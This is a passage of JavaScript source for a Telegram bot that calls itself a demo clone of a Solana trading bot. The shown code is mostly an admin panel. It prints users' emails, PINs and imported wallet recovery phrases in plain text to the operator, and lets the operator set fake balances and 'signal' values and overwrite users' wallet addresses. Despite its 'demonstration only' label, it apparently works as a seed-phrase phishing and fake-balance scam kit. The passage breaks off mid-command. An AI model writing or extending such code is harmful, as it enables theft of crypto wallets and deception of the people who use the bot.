    if (text === `${trader.avatar} ${trader.name}`) return (ctx) => handleCopyTrader(ctx, state, trader.id);
  }

  if (text === "📋 Copy This Trade" && state.selectedTrader) return (ctx) => handleCopyConfirm(ctx, state, state.selectedTrader);

  const buyAmountMatch = text.match(/^(\d+(?:\.\d+)?)$/);
  if (buyAmountMatch && state.currentView === "copy_confirm") return (ctx) => handleCopyAmount(ctx, state, buyAmountMatch[1]);
  if (buyAmountMatch && state.pendingAction === "buy" && state.buyToken) return (ctx) => handleBuyAmount(ctx, state, buyAmountMatch[1]);

  if (state.pendingAction === "sell" && text === "25%") return (ctx) => handleSellPct(ctx, state, "25");
  if (state.pendingAction === "sell" && text === "50%") return (ctx) => handleSellPct(ctx, state, "50");
  if (state.pendingAction === "sell" && text === "🔥 100%") return (ctx) => handleSellPct(ctx, state, "100");

  if (text === "🔔 Notifications ON" || text === "🔕 Notifications OFF") return (ctx) => handleAlertsToggle(ctx, state);

  if (text.startsWith("Slippage:")) return (ctx) => handleSettingsToggle(ctx, state, "slippage");
  if (text.startsWith("Auto-buy:")) return (ctx) => handleSettingsToggle(ctx, state, "autoBuy");
  if (text.startsWith("MEV Protection:")) return (ctx) => handleSettingsToggle(ctx, state, "mevProtection");

  if (text === "🔙 Back") {
    if (state.currentView === "trader_detail" || state.currentView === "copy_confirm") {
      return (ctx) => handleDashCopy(ctx, state);
    }
    return (ctx) => handleMenuDashboard(ctx, state);
  }

  return null;
}

async function handleSettingsToggle(ctx, state, setting) {
  state[setting] = !state[setting];
  state.currentView = "settings";
  return replyWithCachedPhoto(ctx, "settings", {
    caption:
      "⚙️ *Settings*\n\n" +
      "Toggle trading options below:\n\n" +
      `• *Slippage* — ${state.slippage ? "ON ✅" : "OFF ❌"}\n` +
      `• *Auto-buy* — ${state.autoBuy ? "ON ✅" : "OFF ❌"}\n` +
      `• *MEV Protection* — ${state.mevProtection ? "ON ✅" : "OFF ❌"}\n`,
    parse_mode: "Markdown",
    reply_markup: settingsKeyboard(state).reply_markup,
  });
}

bot.start((ctx) => {
  console.log("🤖 Received /start from chat:", ctx?.chat?.id);
  const state = getState(ctx);
  state.awaitingEmail = false;
  state.awaitingPin = false;
  state.awaitingPinConfirm = false;
  state.awaitingSwapAmount = false;
  state.swapPair = null;
  state.awaitingWithdrawAmount = false;
  state.withdrawToken = null;
  state.awaitingStakeAmount = false;
  state.stakeToken = null;
  state.currentView = null;
  state.pendingAction = null;
  state.selectedTrader = null;
  return replyWithCachedPhoto(ctx, "welcome", {
    caption: WELCOME_TEXT,
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
});

bot.help((ctx) => {
  return replyWithCachedPhoto(ctx, "welcome", {
    caption:
      "ℹ️ *Solana Trading Bot (Mock Clone)*\n\n" +
      "This is a UI clone of @sol_trading_helper_bot for demonstration only. " +
      "No real funds or on-chain activity occurs.\n\n" +
      "Commands:\n" +
      "/start — Restart the welcome flow.\n" +
      "/help — Show this help.",
    parse_mode: "Markdown",
    reply_markup: welcomeKeyboard().reply_markup,
  });
});

bot.command("reset", (ctx) => {
  return handleMenuReset(ctx, getState(ctx));
});

bot.command("admin", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  if (registeredUsers.size === 0) {
    return ctx.reply("📭 No registered users yet.");
  }
  const args = (ctx.message.text || "").split(" ").slice(1);

  if (args.length > 0) {
    const subcommand = args[0].toLowerCase();
    if (subcommand === "list") {
      let msg = "📋 *All User IDs*: \n\n";
      for (const user of registeredUsers.values()) {
        msg += `ID: ${user.userId} | @${user.username || "unknown"}\n`;
      }
      return ctx.replyWithMarkdown(msg);
    }
    const targetId = Number(args[0]);
    if (!registeredUsers.has(targetId)) {
      return ctx.reply(`❌ User ${targetId} not found in registered users.\n\nUse /admin list to see all users.`);
    }
    return sendAdminUserDetails(ctx, targetId);
  }

  return sendAdminAllUsers(ctx);
});

function adminKeyboardFor(userId) {
  return {
    inline_keyboard: [
      [
        { text: "🔐 Edit PIN", callback_data: `admin:pin:${userId}` },
        { text: "📧 Edit Email", callback_data: `admin:email:${userId}` },
      ],
      [
        { text: "💰 Edit Balance", callback_data: `admin:balance:${userId}` },
        { text: "🟣 Edit SOL Address", callback_data: `admin:soladdr:${userId}` },
        { text: "🔵 Edit ETH Address", callback_data: `admin:ethaddr:${userId}` },
      ],
      [
        { text: "👤 Edit Username", callback_data: `admin:username:${userId}` },
        { text: "🔄 View Trades", callback_data: `admin:trades:${userId}` },
      ],
      [
        { text: "📊 Edit Signal", callback_data: `admin:signal:${userId}` },
      ],
      [
        { text: "⚙️ Settings: Slippage", callback_data: `admin:toggle:slippage:${userId}` },
        { text: "⚙️ Auto-buy", callback_data: `admin:toggle:autobuy:${userId}` },
      ],
      [
        { text: "⚙️ MEV Protection", callback_data: `admin:toggle:mev:${userId}` },
        { text: "🗑️ Remove User", callback_data: `admin:remove:${userId}` },
      ],
      [
        { text: "🧹 Clear Trades", callback_data: `admin:clear:trades:${userId}` },
        { text: "🧹 Clear Copy", callback_data: `admin:clear:copy:${userId}` },
        { text: "🧹 Clear Stake", callback_data: `admin:clear:stake:${userId}` },
      ],
    ],
  };
}

function sendAdminUserDetails(ctx, targetId) {
  const user = registeredUsers.get(targetId);
  if (!user) {
    return ctx.reply(`❌ User ${targetId} not found.`);
  }
  const solUsd = (user.solBalance || 0) * SOL_PRICE;
  const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
  const usdc = user.usdcBalance || 0;
  const total = solUsd + ethUsd + usdc;
  let text =
    "📋 <b>User Details (ID: " + targetId + ")</b>\n\n" +
    `<b>1.</b> @${user.username || "unknown"} (ID: ${user.userId})\n` +
    `📧 Email: <code>${user.email}</code>\n` +
    `🔐 PIN: <code>${user.pin}</code>\n` +
    `🟣 SOL Address: <code>${user.address || "N/A"}</code>\n` +
    `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n`;
  
  if (user.importedWalletPhrase) {
    text += `\n📥 <b>Imported Wallet:</b>\n`;
    text += `🔑 Recovery Phrase: <code>${user.importedWalletPhrase}</code>\n`;
    text += `🌐 Network: ${user.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
    text += `👛 Type: ${user.importedWalletType || "Unknown"}\n`;
  }
  
  text +=
    `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
    `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
    `💵 USDC: $${usdc.toFixed(2)}\n` +
    `💎 Total: $${total.toFixed(2)}\n` +
    `🔄 Trades: ${user.tradeHistory?.length || 0}\n` +
    `📋 Copy Trades: ${user.copyTrades?.length || 0}\n` +
    `💎 Staking Positions: ${user.stakingPositions?.length || 0}\n` +
    `📅 Registered: ${user.registeredAt}\n` +
    `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n` +
    "Select a field to edit:";
  return ctx.reply(text, { parse_mode: "HTML", reply_markup: adminKeyboardFor(targetId) });
}

async function sendAdminAllUsers(ctx) {
  const messages = [];
  for (const user of registeredUsers.values()) {
    const solUsd = (user.solBalance || 0) * SOL_PRICE;
    const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
    const usdc = user.usdcBalance || 0;
    const total = solUsd + ethUsd + usdc;
    let text =
      "📋 <b>User Details (ID: " + user.userId + ")</b>\n\n" +
      `<b>1.</b> @${user.username || "unknown"} (ID: ${user.userId})\n` +
      `📧 Email: <code>${user.email}</code>\n` +
      `🔐 PIN: <code>${user.pin}</code>\n` +
      `🟣 SOL Address: <code>${user.address || "N/A"}</code>\n` +
      `🔵 ETH Address: <code>${user.ethAddress || "N/A"}</code>\n`;
    
    if (user.importedWalletPhrase) {
      text += `\n📥 <b>Imported Wallet:</b>\n`;
      text += `🔑 Recovery Phrase: <code>${user.importedWalletPhrase}</code>\n`;
      text += `🌐 Network: ${user.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
      text += `👛 Type: ${user.importedWalletType || "Unknown"}\n`;
    }
    
    text +=
      `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
      `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
      `💵 USDC: $${usdc.toFixed(2)}\n` +
      `💎 Total: $${total.toFixed(2)}\n` +
      `🔄 Trades: ${user.tradeHistory?.length || 0}\n` +
      `📋 Copy Trades: ${user.copyTrades?.length || 0}\n` +
      `💎 Staking Positions: ${user.stakingPositions?.length || 0}\n` +
      `📅 Registered: ${user.registeredAt}\n` +
      `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n` +
      "Select a field to edit:";
    messages.push(ctx.reply(text, { parse_mode: "HTML", reply_markup: adminKeyboardFor(user.userId) }));
  }
  await Promise.all(messages);
}

bot.action(/^admin:pin:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "🔐 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new 4-digit PIN for user " + userId + ":");
  adminStates.set(userId, { action: "pin", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:email:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "📧 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new email for user " + userId + ":");
  adminStates.set(userId, { action: "email", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:balance:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "💰 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new balance amount (USD) for user " + userId + ":");
  adminStates.set(userId, { action: "balance", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:soladdr:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  const chatId = ctx.chatId || (ctx.chat && ctx.chat.id);
  debugLog.push({ time: new Date().toISOString(), action: "admin:soladdr callback", userId, chatId, fromId: ctx.from.id });
  await ctx.answerCbQuery();
  try {
    await ctx.editMessageReplyMarkup({
      inline_keyboard: [
        [{ text: "🟣 Cancel", callback_data: `admin:cancel:${userId}` }],
      ],
    });
  } catch (e) {
    debugLog.push({ time: new Date().toISOString(), action: "editMessageReplyMarkup failed (soladdr)", error: e?.message || e?.toString() });
  }
  await ctx.reply("Enter new SOL wallet address for user " + userId + ":");
  adminStates.set(userId, { action: "soladdr", chatId, msgId: ctx?.message?.message_id });
  debugLog.push({ time: new Date().toISOString(), action: "adminStates set (soladdr)", userId, chatId, adminStateCount: adminStates.size });
});

bot.action(/^admin:ethaddr:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "🔵 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new ETH wallet address for user " + userId + ":");
  adminStates.set(userId, { action: "ethaddr", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:username:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "👤 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new username for user " + userId + ":");
  adminStates.set(userId, { action: "username", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:trades:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  let msg = "🔄 *Trade History for @" + (user.username || "unknown") + " (ID: " + userId + "):*\n\n";
  if (!user.tradeHistory || user.tradeHistory.length === 0) {
    msg += "_No trades recorded._";
  } else {
    user.tradeHistory.forEach((t, i) => {
      const details = t.token ? ` ${t.token} $${t.usdValue?.toFixed(2) || t.amount?.toFixed(4) || "0"}` : "";
      msg += `${i + 1}. ${t.type.toUpperCase()}${details} @ ${t.timestamp}\n`;
    });
  }
  return ctx.replyWithMarkdown(msg);
});

bot.action(/^admin:cancel:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  adminStates.delete(userId);
  await ctx.editMessageReplyMarkup({ inline_keyboard: adminKeyboardFor(userId).inline_keyboard });
});

bot.action(/^admin:signal:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.editMessageReplyMarkup({
    inline_keyboard: [
      [{ text: "📊 Cancel", callback_data: `admin:cancel:${userId}` }],
    ],
  });
  await ctx.reply("Enter new signal strength (0-100) for user " + userId + ":");
  adminStates.set(userId, { action: "signal", chatId: ctx.chatId || (ctx.chat && ctx.chat.id), msgId: ctx?.message?.message_id });
});

bot.action(/^admin:toggle:slippage:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  if (!user.settings) user.settings = {};
  user.settings.slippage = !user.settings.slippage;
  user.lastActive = new Date().toISOString();
  saveUsers();
  if (sessions.has(userId)) {
    sessions.get(userId).slippage = user.settings.slippage;
  }
  const status = user.settings.slippage ? "ON ✅" : "OFF ❌";
  await ctx.reply("✅ Slippage for @" + (user.username || "unknown") + " (ID: " + userId + "): " + status);
});

bot.action(/^admin:toggle:autobuy:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  if (!user.settings) user.settings = {};
  user.settings.autoBuy = !user.settings.autoBuy;
  user.lastActive = new Date().toISOString();
  saveUsers();
  if (sessions.has(userId)) {
    sessions.get(userId).autoBuy = user.settings.autoBuy;
  }
  const status = user.settings.autoBuy ? "ON ✅" : "OFF ❌";
  await ctx.reply("✅ Auto-buy for @" + (user.username || "unknown") + " (ID: " + userId + "): " + status);
});

bot.action(/^admin:toggle:mev:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  if (!user.settings) user.settings = {};
  user.settings.mevProtection = !user.settings.mevProtection;
  user.lastActive = new Date().toISOString();
  saveUsers();
  if (sessions.has(userId)) {
    sessions.get(userId).mevProtection = user.settings.mevProtection;
  }
  const status = user.settings.mevProtection ? "ON ✅" : "OFF ❌";
  await ctx.reply("✅ MEV Protection for @" + (user.username || "unknown") + " (ID: " + userId + "): " + status);
});

bot.action(/^admin:remove:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
  registeredUsers.delete(userId);
  saveUsers();
  sessions.delete(userId);
  adminStates.delete(userId);
  await ctx.reply("🗑️ User @" + (user.username || "unknown") + " (ID: " + userId + ") has been removed.");
});

bot.action(/^admin:clear:trades:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  const count = user.tradeHistory?.length || 0;
  user.tradeHistory = [];
  user.lastActive = new Date().toISOString();
  saveUsers();
  await ctx.reply("🧹 Cleared " + count + " trade(s) for @" + (user.username || "unknown") + " (ID: " + userId + ").");
});

bot.action(/^admin:clear:copy:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  const count = user.copyTrades?.length || 0;
  user.copyTrades = [];
  user.lastActive = new Date().toISOString();
  saveUsers();
  await ctx.reply("🧹 Cleared " + count + " copy trade(s) for @" + (user.username || "unknown") + " (ID: " + userId + ").");
});

bot.action(/^admin:clear:stake:(\d+)$/, async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const userId = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  const user = registeredUsers.get(userId);
  if (!user) {
    return ctx.reply("❌ User not found");
  }
  const count = user.stakingPositions?.length || 0;
  user.stakingPositions = [];
  user.lastActive = new Date().toISOString();
  saveUsers();
  await ctx.reply("🧹 Cleared " + count + " staking position(s) for @" + (user.username || "unknown") + " (ID: " + userId + ").");
});

const adminStates = new Map();

function isAdmin(id) {
  const adminIds = (process.env.ADMIN_ID || "").split(",").map((a) => Number(a.trim())).filter(Boolean);
  return adminIds.includes(id);
}

bot.command("admin balance", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 2) {
    return ctx.reply("Usage: /admin balance <userId> <amount>\nExample: /admin balance 123456 500");
  }
  const targetId = Number(args[0]);
  const amount = parseFloat(args[1]);
  if (!registeredUsers.has(targetId) && !sessions.has(targetId)) {
    return ctx.reply(`❌ User ${targetId} not found.`);
  }
  if (isNaN(amount)) {
    return ctx.reply("❌ Invalid amount.");
  }
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    user.solBalance = amount / SOL_PRICE;
    user.ethBalance = amount / ETH_PRICE;
    user.usdcBalance = amount;
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ Updated balances for user ${targetId}:\n💵 SOL: $${amount}\n💵 ETH: $${amount}\n💵 USDC: $${amount}`);
  }
  if (sessions.has(targetId)) {
    const state = sessions.get(targetId);
    state.solBalance = amount / SOL_PRICE;
    state.ethBalance = amount / ETH_PRICE;
    state.usdcBalance = amount;
    syncState(state);
  }
});

bot.command("admin pin", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 2) {
    return ctx.reply("Usage: /admin pin <userId> <new_pin>\nExample: /admin pin 123456 8321");
  }
  const targetId = Number(args[0]);
  const newPin = args[1];
  if (!/^\d{4}$/.test(newPin)) {
    return ctx.reply("❌ PIN must be 4 digits.");
  }
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    user.pin = newPin;
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ PIN for user ${targetId} (@${user.username || "unknown"}) updated to: ${newPin}`);
  } else if (sessions.has(targetId)) {
    const state = sessions.get(targetId);
    state.pin = newPin;
    syncState(state);
    ctx.reply(`✅ PIN for user ${targetId} updated.`);
  } else {
    ctx.reply(`❌ User ${targetId} not found.`);
  }
});

bot.command("admin email", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 2) {
    return ctx.reply("Usage: /admin email <userId> <new_email>\nExample: /admin email 123456 new@mail.com");
  }
  const targetId = Number(args[0]);
  const newEmail = args[1];
  if (!newEmail.includes("@")) {
    return ctx.reply("❌ Invalid email address.");
  }
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    user.email = newEmail;
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ Email for user ${targetId} (@${user.username || "unknown"}) updated to: ${newEmail}`);
  } else if (sessions.has(targetId)) {
    const state = sessions.get(targetId);
    state.email = newEmail;
    syncState(state);
    ctx.reply(`✅ Email for user ${targetId} updated.`);
  } else {
    ctx.reply(`❌ User ${targetId} not found.`);
  }
});

bot.command("admin address", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 2) {
    return ctx.reply("Usage: /admin address <userId> <new_wallet_address>\nExample: /admin address 123456 newAddress123");
  }
  const targetId = Number(args[0]);
  const newAddress = args[1];
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    user.address = newAddress;
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ Wallet address for user ${targetId} (@${user.username || "unknown"}) updated to: ${newAddress}`);
  } else if (sessions.has(targetId)) {
    const state = sessions.get(targetId);
    state.address = newAddress;
    syncState(state);
    ctx.reply(`✅ Wallet address for user ${targetId} updated.`);
  } else {
    ctx.reply(`❌ User ${targetId} not found.`);
  }
});

bot.command("admin username", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 2) {
    return ctx.reply("Usage: /admin username <userId> <new_username>\nExample: /admin username 123456 newuser");
  }
  const targetId = Number(args[0]);
  const newUsername = args[1];
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    user.username = newUsername;
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ Username for user ${targetId} updated to: ${newUsername}`);
  } else {
    ctx.reply(`❌ User ${targetId} not found in registered users.`);
  }
});

bot.command("admin clear", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 1) {
    return ctx.reply("Usage: /admin clear <userId> [trade|copy|stake|all]\nDefault: all");
  }
  const targetId = Number(args[0]);
  const clearType = args[1] || "all";
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    if (clearType === "trade" || clearType === "all") {
      user.tradeHistory = [];
    }
    if (clearType === "copy" || clearType === "all") {
      user.copyTrades = [];
    }
    if (clearType === "stake" || clearType === "all") {
      user.stakingPositions = [];
    }
    user.lastActive = new Date().toISOString();
    saveUsers();
    ctx.reply(`✅ Cleared ${clearType} for user ${targetId} (@${user.username || "unknown"}).`);
  } else if (sessions.has(targetId)) {
    const state = sessions.get(targetId);
    if (clearType === "trade" || clearType === "all") {
      state.tradeHistory = [];
    }
    if (clearType === "copy" || clearType === "all") {
      state.copyTrades = [];
    }
    if (clearType === "stake" || clearType === "all") {
      state.stakingPositions = [];
    }
    syncState(state);
    ctx.reply(`✅ Cleared ${clearType} for user ${targetId}.`);
  } else {
    ctx.reply(`❌ User ${targetId} not found.`);
  }
});

bot.command("admin list", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  if (registeredUsers.size === 0) {
    return ctx.reply("📭 No registered users yet.");
  }
  let msg = "📋 <b>All User IDs:</b>\n\n";
  for (const user of registeredUsers.values()) {
    msg += `ID: ${user.userId} | @${user.username || "unknown"}\n`;
  }
  return ctx.reply(msg, { parse_mode: "HTML" });
});

bot.command("admin trades", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 1) {
    return ctx.reply("Usage: /admin trades <userId>\nExample: /admin trades 999001");
  }
  const targetId = Number(args[0]);
  if (!registeredUsers.has(targetId) && !sessions.has(targetId)) {
    return ctx.reply(`❌ User ${targetId} not found.`);
  }
  let state;
  if (registeredUsers.has(targetId)) {
    const user = registeredUsers.get(targetId);
    state = { tradeHistory: user.tradeHistory || [], copyTrades: user.copyTrades || [], stakingPositions: user.stakingPositions || [] };
  } else {
    const s = sessions.get(targetId);
    state = { tradeHistory: s.tradeHistory || [], copyTrades: s.copyTrades || [], stakingPositions: s.stakingPositions || [] };
  }
  let msg = "🔄 *Trade History for user " + targetId + ":*\n\n";
  if (state.tradeHistory.length === 0) {
    msg += "_No trades recorded._";
  } else {
    state.tradeHistory.forEach((t, i) => {
      msg += `${i + 1}. ${t.type.toUpperCase()} ${t.token || ""} $${t.usdValue?.toFixed(2) || t.amount?.toFixed(4) || "0"} @ $${t.price?.toFixed(2) || "0"}\n`;
      msg += `   _${t.timestamp}_\n`;
    });
  }
  msg += "\n📋 *Copy Trades:*\n\n";
  if (state.copyTrades.length === 0) {
    msg += "_No copy trades._";
  } else {
    state.copyTrades.forEach((ct, i) => {
      msg += `${i + 1}. ${ct.traderName || ct.traderId} - ${ct.trade?.action} ${ct.trade?.token} $${ct.trade?.amount.toFixed(2)}\n`;
    });
  }
  msg += "\n💎 *Staking:*\n\n";
  if (state.stakingPositions.length === 0) {
    msg += "_No staking positions._";
  } else {
    state.stakingPositions.forEach((s, i) => {
      msg += `${i + 1}. ${s.token} ${s.amount.toFixed(4)} - ${s.timestamp}\n`;
    });
  }
  return ctx.replyWithMarkdown(msg);
});

bot.command("admin signal", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 1) {
    return ctx.reply("Usage: /admin signal <userId>\nExample: /admin signal 999001");
  }
  const targetId = Number(args[0]);
  if (!registeredUsers.has(targetId) && !sessions.has(targetId)) {
    return ctx.reply(`❌ User ${targetId} not found.`);
  }
  const state = registeredUsers.has(targetId) ? null : sessions.get(targetId);
  const user = registeredUsers.get(targetId);
  if (user) {
    const solUsd = (user.solBalance || 0) * SOL_PRICE;
    const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
    return ctx.replyWithMarkdown(
      "📊 *Signal Strength for user " + targetId + " (@" + (user.username || "unknown") + "):*\n\n" +
      "💎 Total Balance: $" + (solUsd + ethUsd + (user.usdcBalance || 0)).toFixed(2) + "\n" +
      "🟣 SOL: $" + solUsd.toFixed(2) + " | 🔵 ETH: $" + ethUsd.toFixed(2) + " | 💵 USDC: $" + (user.usdcBalance || 0).toFixed(2) + "\n" +
      "🔄 Total Trades: " + (user.tradeHistory?.length || 0) + "\n" +
      "📋 Copy Trades: " + (user.copyTrades?.length || 0) + "\n" +
      "💎 Staking Positions: " + (user.stakingPositions?.length || 0) + "\n" +
      "⚙️ Settings: Slippage=" + (user.settings?.slippage ? "ON" : "OFF") + " Auto-buy=" + (user.settings?.autoBuy ? "ON" : "OFF") + " MEV=" + (user.settings?.mevProtection ? "ON" : "OFF")
    );
  }
  return ctx.reply(`❌ User ${targetId} not found in registered users.`);
});

bot.command("admin remove", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const args = ctx.message.text.split(" ").slice(2);
  if (args.length < 1) {
    return ctx.reply("Usage: /admin remove <userId>\nExample: /admin remove 999001");
  }
  const targetId = Number(args[0]);
  if (registeredUsers.has(targetId)) {
    registeredUsers.delete(targetId);
    saveUsers();
    if (sessions.has(targetId)) sessions.delete(targetId);
    return ctx.reply(`✅ User ${targetId} has been removed from registered users.`);
  }
  if (sessions.has(targetId)) {
    sessions.delete(targetId);
    return ctx.reply(`✅ Session for user ${targetId} has been cleared.`);
  }
  return ctx.reply(`❌ User ${targetId} not found.`);
});

bot.command("admin wipe", (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  const count = registeredUsers.size;
  const ids = Array.from(registeredUsers.keys()).join(", ");
  if (count === 0) {
    return ctx.reply("📭 No registered users to clear.");
  }
  const confirmKeyboard = Markup.inlineKeyboard([
    [
      { text: "✅ Yes, wipe all", callback_data: "admin:wipe:confirm" },
      { text: "❌ Cancel", callback_data: "admin:wipe:cancel" },
    ],
  ]);
  return ctx.replyWithMarkdown(
